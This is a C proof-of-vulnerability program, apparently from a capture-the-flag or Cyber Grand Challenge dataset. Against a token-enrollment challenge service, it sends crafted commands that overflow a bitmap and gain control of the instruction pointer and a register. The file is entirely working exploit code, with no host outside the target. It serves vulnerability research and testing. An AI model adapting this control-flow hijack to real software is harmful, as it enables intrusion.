/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include "service.h"
#include "atox.h"
#include "comms.h"
#include <libpov.h>

static char* digits = "0123456789ABCDEF";

void
bzero(buf, num)

char *buf;				/* buffer to zeroize */
unsigned int num;		/* the length of the buffer */
/*
* PURPOSE : Set all bytes in buffer to zero
*
* RETURN : None
*
*F*/
{
	int i;
	for (i = 0; i < num; i++)
		buf[i] = buf[i] ^ buf[i];

}

int
b10_uint(buf, num)

char *buf;				/* buffer to hold the number string */
unsigned int num;		/* the number to convert */
/*
* PURPOSE : Convert a number into a string and store it in a buffer
*
* RETURN : The length of the number string
*
*F*/
{
	char tmp[12];
	bzero(tmp, 12);

	if (num == 0) {
		buf[0] = '0';
		return 1;
	} else {
		int i, size;
		for(i=0; i<10 && num!=0; i++) {
			tmp[i] = digits[num % 10];
			num = num / 10;
		}
		size = i;

		for(i=size; i > 0; i--) {
			buf[i-1] = tmp[size-i];
		}

		return size;

	}
	return 0;
}

int main(void) {
	type1_vals t1vals;
	uint32_t mask_eip, mask_reg;
	size_t bytes;
	static char* exit_string = "quit, , , !";

	static char* getTokenUserPass = "newTokens,UserPass,417599999,user/pass,Use=";
	static char* pov_str1 = ",Token,";
	static char* pov_str2 = ",";
	static char* pov_str3 = ",A!";
	static char* enrollInvalidToken_str1 = "enroll,Token,5,Token=2886257;Expiration=0;Use=";
	static char* enrollInvalidToken_str2 = ",Subject=Great Company LLC;Key=THISISMYKEYS!";
	static char* enrollInvalidTokenPwn_str = "AAAABBBCCCC,Token,5,Token=789,AAAABBBBCCCCDDDD!";
	static char* getTokenUP_str = "newTokens,UserPass,1,user/pass,Use=enroll!";

	char eip_buf[9];
	char edx_buf[12];

	int len, len1, len2;
	char buffer[1024];
	char token[1024];
	int ret;

	mask_eip = 0xFAFAFAFA;
	mask_reg = 0xFFFFFFFF;

	if(type1_negotiate(mask_eip, mask_reg, 2, &t1vals))
		_terminate(1);

	eip_buf[0] = 'n';
    eip_buf[1] = 'e';
    eip_buf[2] = 'w';
    eip_buf[3] = 'T';
    eip_buf[4] = ((t1vals.ipval >>  0) & 0xFF);
    eip_buf[5] = ((t1vals.ipval >>  8) & 0xFF);
    eip_buf[6] = ((t1vals.ipval >> 16) & 0xFF);
    eip_buf[7] = ((t1vals.ipval >> 24) & 0xFF);
    eip_buf[8] = '\x1f';

    for(int j=4; j<8; j++) {
    	if(eip_buf[j] == 0x00 || eip_buf[j] == 0x2c) 
    		eip_buf[j] = eip_buf[j] | 0x01;
    	if(eip_buf[j] == 0x3a || eip_buf[j] == 0x3b || eip_buf[j] == 0x21)
    		eip_buf[j] = eip_buf[j] | 0x04;
    }

    b10_uint(edx_buf, t1vals.regval);

	// getToken with user/pass
	len = strlen(getTokenUserPass);
	if(transmit_all(STDOUT, getTokenUserPass, len))
		_terminate(1);
	
	if(transmit_all(STDOUT, eip_buf, 8))
		_terminate(1);

	if(transmit_all(STDOUT, "!", strlen("!")))
		_terminate(1);			

	if((ret = read_until_delim_or_n(STDIN, token, '?', sizeof(buffer), &bytes)))
		_terminate(3);

	len1 = strlen(enrollInvalidToken_str1);
	len2 = strlen(enrollInvalidToken_str2);
	for(int i=1; i<80; i++) {

		if(transmit_all(STDOUT, enrollInvalidToken_str1, len1))
			_terminate(1);	

		if(transmit_all(STDOUT, eip_buf, 9))
			_terminate(1);

		if(transmit_all(STDOUT, enrollInvalidToken_str2, len2))
			_terminate(1);	

		if((ret = read_until_delim_or_n(STDIN, buffer, '?', sizeof(buffer), &bytes)))
			_terminate(3);
	}

	//overflow bitmap
	len = strlen(enrollInvalidTokenPwn_str);
	if(transmit_all(STDOUT, enrollInvalidTokenPwn_str, len))
			_terminate(1);	

	if((ret = read_until_delim_or_n(STDIN, buffer, '?', sizeof(buffer), &bytes)))
			_terminate(3);

	// send pov
	if(transmit_all(STDOUT, eip_buf, 8))
		_terminate(1);

	len = strlen(pov_str1);
	if(transmit_all(STDOUT, pov_str1, len))
		_terminate(1);

	len = strlen(edx_buf);
	if(transmit_all(STDOUT, edx_buf, len))
		_terminate(1);

	len = strlen(pov_str2);
	if(transmit_all(STDOUT, pov_str2, len))
		_terminate(1);

	len = strlen(token);
	if(transmit_all(STDOUT, token, len))
		_terminate(1);

	len = strlen(pov_str3);
	if(transmit_all(STDOUT, pov_str3, len))
		_terminate(1);

	
	if((ret = read_until_delim_or_n(STDIN, token, '?', sizeof(token), &bytes)))
		_terminate(2);

	len = strlen(getTokenUP_str);
	if(transmit_all(STDOUT, getTokenUP_str, len))
		_terminate(1);

	if(bytes != len)
		_terminate(2);
	
	if((ret = read_until_delim_or_n(STDIN, token, '?', sizeof(token), &bytes)))
		_terminate(2);

	len = strlen(exit_string);
	if(transmit_all(STDOUT, exit_string, len))
		_terminate(1);

}